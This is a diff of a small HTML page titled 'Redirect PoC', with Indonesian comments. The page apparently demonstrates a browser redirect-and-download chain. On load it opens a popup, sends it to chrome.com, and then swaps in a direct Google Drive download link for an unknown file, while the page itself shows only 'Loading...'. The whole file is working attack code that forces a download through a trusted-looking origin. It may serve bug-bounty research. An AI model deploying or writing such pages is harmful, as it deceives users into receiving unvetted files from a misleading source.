@@ -2,31 +2,39 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Redirect + Download</title>
+  <title>Redirect PoC</title>
+  <script>
+    function chainRedirect(w, urls, index = 0) {
+      if (index < urls.length) {
+        console.log("Redirecting to:", urls[index]);
+
+        w.location.replace(urls[index]);
+
+        // stop kalau sudah terakhir
+        if (index === urls.length - 1) return;
+
+        setTimeout(() => {
+          chainRedirect(w, urls, index + 1);
+        }, 1500); // diperbesar biar stabil
+      }
+    }
+
+    function startRedirect() {
+      let w = window.open("about:blank");
+
+      setTimeout(() => {
+        chainRedirect(w, [
+          "https://chrome.com",
+
+          // pakai link lebih stabil
+          "https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL&export=download&authuser=0&confirm=t&uuid=733afb2e-0d6c-4da7-8ec5-883d0b792a34&at=AGN2oQ0VkjDRWTpZ7Vs-SmKiGHJ6:1773905849768"
+        ]);
+      }, 500);
+    }
+  </script>
 </head>
-<body>
 
-<h3>Loading... download dalam 5 detik</h3>
-
-<script>
-// STEP 1: redirect sekali
-if (!sessionStorage.getItem("redirected")) {
-    sessionStorage.setItem("redirected", "true");
-
-    window.open = "https://hackerone.com";
-
-} else {
-
-    // STEP 2: delay 5 detik → buka download
-    setTimeout(function() {
-        window.open(
-            "https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL&export=download&authuser=0&confirm=t&uuid=733afb2e-0d6c-4da7-8ec5-883d0b792a34&at=AGN2oQ0VkjDRWTpZ7Vs-SmKiGHJ6:1773905849768",
-            "_blank"
-        );
-    }, 3000);
-
-}
-</script>
-
+<body onload="startRedirect()">
+  <h3>Loading...</h3>
 </body>
 </html>
